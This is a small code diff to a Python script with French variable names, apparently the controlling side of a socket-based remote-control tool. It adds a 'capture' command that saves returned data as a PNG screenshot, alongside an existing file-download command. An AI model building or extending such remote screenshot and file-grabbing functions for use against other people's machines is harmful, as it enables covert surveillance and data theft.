@@ -91,6 +91,8 @@ while True:
 
     if len(commande_split) == 2 and commande_split[0] == "dl":
         dl_file_name = commande_split[1]
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+        dl_file_name = commande_split[1] + ".png"
 
     data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
 
